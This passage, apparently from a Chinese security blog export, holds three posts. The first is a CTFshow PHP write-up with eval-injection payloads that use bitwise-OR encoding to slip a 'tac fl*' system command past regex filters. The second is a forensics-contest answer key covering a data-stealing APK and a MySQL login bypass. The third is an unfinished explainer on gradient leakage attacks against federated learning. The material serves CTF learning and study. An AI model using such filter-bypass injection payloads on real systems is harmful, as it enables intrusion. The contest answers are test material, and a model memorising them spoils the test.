class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-47">payload</h3>
<p>基本跟上面几个区别不大，就是变了过滤和顺序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%20%06%0c%02&quot;|&quot;%60%60%60%20%60%60%28&quot;)&amp;v3=-</span><br></pre></td></tr></table></figure>
<h2 id="web145">web145</h2>
<h3 id="源码-48">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-48">payload</h3>
<p>这几题就是通过一个知识点反复考过滤，这边那使用了|</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v3=|(&#x27;%13%19%13%14%05%0d&#x27;|&#x27;%60%60%60%60%60%60&#x27;)(&#x27;%14%01%03%20%06%02&#x27;|&#x27;%60%60%60%20%60%28&#x27;)|&amp;v2=1</span><br></pre></td></tr></table></figure>
<p>最后几道也是各种技巧了，简单看了一下，没有什么新意，不做了</p>
<h2 id="web146">web146</h2>
<h2 id="web147">web147</h2>
<h2 id="web148">web148</h2>
<h2 id="web149">web149</h2>
<h2 id="web150">web150</h2>
<h2 id="web150plus">web150plus</h2>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>php特性</tag>
      </tags>
  </entry>
  <entry>
    <title>Back-2024獬豸杯</title>
    <url>/2024/03/12/Back-2024%E7%8D%AC%E8%B1%B8%E6%9D%AF/</url>
    <content><![CDATA[<h1>Back-2024獬豸杯</h1>
<h2 id="前言">前言</h2>
<p>当时整场比赛打的不好，最后还有部分flag到最后没交上去，拖了一个寒假，现在才来重新进行比赛的复现。而且也没什么取证工具，基本以手搓为主，太惨了，qwq</p>
<h2 id="工具使用情况">工具使用情况</h2>
<p>所使用的除取证大师外，均为开源或者可以在网上找到资源的软件</p>
<ol>
<li>取证大师</li>
<li>jadx</li>
<li>AXIOM</li>
</ol>
<h2 id="APK分析">APK分析</h2>
<h3 id="1、APP包名是多少。（标准格式：com-xxx-xxx）">1、APP包名是多少。（标准格式：<a href="http://com.xxx.xxx">com.xxx.xxx</a>）</h3>
<p>通过使用jadx对apk进行反编译，查看AndroidManifest.xml配置文件，发现包名</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;28&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;9&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.example.readeveryday&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;28&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;9&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;19&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;22&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_SMS&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@drawable/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;StartShow&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.example.readeveryday</span><br></pre></td></tr></table></figure>
<h3 id="2、apk的主函数名是多少。（标准格式：comlongxin）">2、apk的主函数名是多少。（标准格式：comlongxin）</h3>
<p>同样在这个xml文件下，发现主函数的名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">StartShow</span><br></pre></td></tr></table></figure>
<h3 id="3、apk的签名算法是什么。（标准格式：xxx）">3、apk的签名算法是什么。（标准格式：xxx）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHA1withRSA</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/12/3ml7GZjaty1KMh2.png" alt="2024xiezhi_1"></p>
<h3 id="4、apk的应用版本是多少。（标准格式：1-2）">4、apk的应用版本是多少。（标准格式：1.2）</h3>
<p>仍然是xml中的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.0</span><br></pre></td></tr></table></figure>
<h3 id="5、请判断该apk是否需要联网。">5、请判断该apk是否需要联网。</h3>
<p>在主函数中可以看到存在联网权限的申请</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/12/TYwSefMj5mc48od.png" alt="2024xiezhi_2"></p>
<h3 id="6、APK回传地址？（标准格式：127-0-0-1-12345）">6、APK回传地址？（标准格式：127.0.0.1:12345）</h3>
<p>在MainActivity函数中，checkAndUpload的类中发现也存在回传地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.0.102.135:8888</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/12/1PzhTpNiVkw6DeB.png" alt="2024xiezhi_4"></p>
<p>同样也有师傅采取了静态分析的方法</p>
<p><a href="https://mogua.co/">摸瓜-查诈骗APP_查病毒APP_免费APK反编译分析工具 (mogua.co)</a></p>
<p><img src="https://s2.loli.net/2024/03/12/1PzhTpNiVkw6DeB.png" alt="2024xiezhi_3"></p>
<h3 id="7、APK回传数据文件名称是什么。（标准格式：1-txt）">7、APK回传数据文件名称是什么。（标准格式：1.txt）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Readdata.zip</span><br></pre></td></tr></table></figure>
<p>同样在checkAndUpload类中发现存在数据文件名称</p>
<p><img src="https://s2.loli.net/2024/03/12/IrJ18QalR4PTtsn.png" alt="2024xiezhi_5"></p>
<h3 id="8、APK回传数据加密密码是多少。（标准格式：admin）">8、APK回传数据加密密码是多少。（标准格式：admin）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">19_08.05r</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/12/QaToPAX7h89y1dq.png" alt="2024xiezhi_6"></p>
<h3 id="9-题目描述">9.题目描述</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ABE</span><br></pre></td></tr></table></figure>
<p>A.手机通讯录<br>
B.手机短信<br>
C.相册<br>
D.GPS定位信息<br>
E.手机应用列表</p>
<p><img src="https://s2.loli.net/2024/03/12/U1X9QD5N3a2VyPj.png" alt="2024xiezhi_7"></p>
<h2 id="计算机取证">计算机取证</h2>
<h3 id="1、计算机系统的安装日期是什么时候。（标准格式：20240120）">1、计算机系统的安装日期是什么时候。（标准格式：20240120）</h3>
<p><img src="https://s2.loli.net/2024/03/12/CNc6t7n4qrSRoTp.png" alt="2024xiezhi_8"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20240112</span><br></pre></td></tr></table></figure>
<h3 id="2、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1-zip）">2、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1.zip）</h3>
<p><img src="https://s2.loli.net/2024/03/12/JBAQ3O91lnmPYK8.png" alt="2024xiezhi_9"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data.zip</span><br></pre></td></tr></table></figure>
<h3 id="1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20-12-12-12">1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20.12:12:12)</h3>
<p>在apple备忘录里存放了一条密码</p>
<p><img src="https://s2.loli.net/2024/03/12/EI1ut4NpkGTPnLF.png" alt="2024xiezhi_19"></p>
<p>这个密码解密了BitLocker加密的磁盘</p>
<p><img src="https://s2.loli.net/2024/03/12/lJHuKog6at5Mbdj.png" alt="2024xiezhi_20"></p>
<p>进行掩码爆破</p>
<p><img src="https://s2.loli.net/2024/03/12/75TUozAQONqRkL9.png" alt="2024xiezhi_21"></p>
<p>得到数据库文件</p>
<p>这一块利用免密登录，在MySQL配置文件my.ini的[mysqld]块下加入skip-grant-tables设置免密登录</p>
<p>然后打开数据库进行查询</p>
<h3 id="1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20-12-12-12-2">1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20.12:12:12)</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2021-03-17.15:49:52</span><br></pre></td></tr></table></figure>
<h3 id="2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）">2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>
<h3 id="3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）">3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">488313</span><br></pre></td></tr></table></figure>
<h3 id="4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）">4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1486</span><br></pre></td></tr></table></figure>
<h3 id="1、请问邮箱服务器的登录密码是多少。（标准格式：admin）">1、请问邮箱服务器的登录密码是多少。（标准格式：admin）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">900110</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/12/7EdsrxgNHnIzMFW.png" alt="2024xiezhi_22"></p>
<h3 id="2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）">2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/12/TqY9iCUhIA3vblu.png" alt="2024xiezhi_23"></p>
<h3 id="3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）">3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>
<p>使用的是hMailserver</p>
<h3 id="4、请问约定见面的地点在哪里。（标准格式：太阳路668号）">4、请问约定见面的地点在哪里。（标准格式：太阳路668号）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">中国路999号</span><br></pre></td></tr></table></figure>
<p>jpg隐写</p>
<p><img src="https://s2.loli.net/2024/03/12/WB3dyUZfhO4njrN.png" alt="2024xiezhi_24"></p>
<h2 id="手机备份包">手机备份包</h2>
<h3 id="1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20-12-12-12">1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20.12:12:12)</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-01-15.14:19:44</span><br></pre></td></tr></table></figure>
<p>在解压缩的包中，就已经显示出备份时间，但是使用AXIOM解析出来的时间差了1s</p>
<p><img src="https://s2.loli.net/2024/03/12/G5q9t3yVFYrCmza.png" alt="2024xiezhi_10"></p>
<h3 id="2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）">2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/12/RDrLh7XbAzQWytk.png" alt="2024xiezhi_11"></p>
<p>当然，直接翻apps.json文件也可以找到</p>
<p><img src="https://s2.loli.net/2024/03/12/sFrB3KzvQJxh1m2.png" alt="2024xiezhi_12"></p>
<h3 id="3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）">3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）</h3>
<p>ICCID寻找的是手机的SIM卡的活动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89860320245121150689</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/12/zSnWUHhpm3IVjEi.png" alt="2024xiezhi_13"></p>
<h3 id="4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）">4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）</h3>
<p>答案为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20240115</span><br></pre></td></tr></table></figure>
<p>有几个思路</p>
<p>其一，通过信息的登录验证码去看登录时间</p>
<p><img src="https://s2.loli.net/2024/03/12/7tYV2gQZSFXLGsy.png" alt="2024xiezhi_14"></p>
<p>其二，通过网络流量去看</p>
<p><img src="https://s2.loli.net/2024/03/12/DKoJgGERA7b4z8c.png" alt="2024xiezhi_15"></p>
<h3 id="1、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）">1、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">天铂华庭</span><br></pre></td></tr></table></figure>
<p>火眼有高德数据相关的解析，但是没申请</p>
<p><a href="https://github.com/WXjzcccc/ForensicsTool">GitHub - WXjzcccc/ForensicsTool: 简单的取证工具</a></p>
<h3 id="1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie-db">1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie.db)</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bookmarks.db</span><br></pre></td></tr></table></figure>
<p>通过谷歌搜索Safari书签的默认数据库可以看到名称，通过AXIOM和取证大师的结合也可以查看</p>
<p><img src="https://s2.loli.net/2024/03/12/Pb7YpOCmaQdGuNt.png" alt="2024xiezhi_16"></p>
<h3 id="2、手机机主计划去哪里旅游。（标准格式：苏州）">2、手机机主计划去哪里旅游。（标准格式：苏州）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拉萨</span><br></pre></td></tr></table></figure>
<p>查看浏览器的搜索记录，发现有询问西藏拉萨旅游的相关情况</p>
<p><img src="https://s2.loli.net/2024/03/12/nG65TEHDjgUwcx1.png" alt="2024xiezhi_17"></p>
<h3 id="1、手机机主查询过那个人的身份信息。（标准格式：龙信）">1、手机机主查询过那个人的身份信息。（标准格式：龙信）</h3>
<p>这题卡住了，我手上现有的工具都无法识别出小西米的数据库文件</p>
<p>根据toto局的说法，可以通过找到小西米的绝对路径进行提取im5db文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">龙黑</span><br></pre></td></tr></table></figure>
<h3 id="2、请问机主共转多少费用用于数据查询。（标准格式：1000）">2、请问机主共转多少费用用于数据查询。（标准格式：1000）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1100</span><br></pre></td></tr></table></figure>
<h3 id="3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）">3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）</h3>
<p>根据身份证的规则，即可分辨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/12/BnzJjQE98k45iqF.png" alt="2024xiezhi_18"></p>
]]></content>
      <categories>
        <category>Back</category>
      </categories>
      <tags>
        <tag>2024獬豸杯</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-安全（2）梯度泄露攻击</title>
    <url>/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1>梯度泄露攻击</h1>
<h2 id="什么是梯度？">什么是梯度？</h2>
<p>梯度是一个向量求导的导数，使用梯度就是为了寻找最快得到损失函数的方向，而梯度交换是现代多节点机器学习系统中广泛使用的一种方法。</p>
<h2 id="什么是联邦学习？">什么是联邦学习？</h2>
<p>首先明确，联邦学习本质上是一种<strong>分布式</strong>机器学习技术，或机器学习<strong>框架</strong>。</p>
<p>联邦学习的目标是在保证数据隐私安全及合法合规的基础上，实现共同建模，提升AI模型的效果。</p>
<p>众所周知，人工智能技术有两个关键点，模型和数据，而受限于数据量巨大，集中不易，产生了分布式机器学习技术，在此之上，联邦学习于 2016 年被谷歌首次提出，设计动机是为了在智能程序训练的过程中保护手机或平板电脑中用户的隐私数据，进而提出一种数据不动模型动的新型分布式机器学习范式，称之为 Federated Learning，中文译为联邦学习。</p>
<p>能够保护隐私的原因是每个用户的数据始终储存在本地，仅有模型的梯度在不同设备之前传播。这类算法不需要将数据集中到一处，可以在保护用户隐私的同时，也让模型从海量数据中受益。例如多家医院可以共同训练一个医疗模型而无需共享患者的医疗数据。</p>
<p>根据各参与方数据划分的不同，联邦学习可以分为横向联邦学习，纵向联邦学习和联邦迁移学习。</p>
<p><img src="https://s2.loli.net/2023/11/15/Q3tMkjqGnIErmgB.png" alt=""></p>
<h2 id="攻击原理及过程">攻击原理及过程</h2>
<p>论文原址<a href="https://arxiv.org/abs/1906.08935">Deep Leakage from Gradients </a></p>
<p>每个节点对样本进行采样，进行节点处的梯度计算</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="normal">ℓ</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo separator="true">,</mo><msub><mi>W</mi><mi>t</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>y</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>W</mi><mi>t</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\nabla W_ {t,i} =  \frac {\partial  \ell (F(x_ {t,i},W_ {t}),y_ {t,i})}{\partial W_ {t}}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.263em;vertical-align:-0.836em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord">ℓ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.836em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>梯度在N个服务器上被平均</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mi>t</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>N</mi></mfrac><munderover><mo>∑</mo><mi>j</mi><mi>N</mi></munderover><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\nabla W_ {t}  =  \frac {1}{N}   \sum _ {j}^ {N}   \nabla W_ {t,j}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.2421em;vertical-align:-1.4138em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span 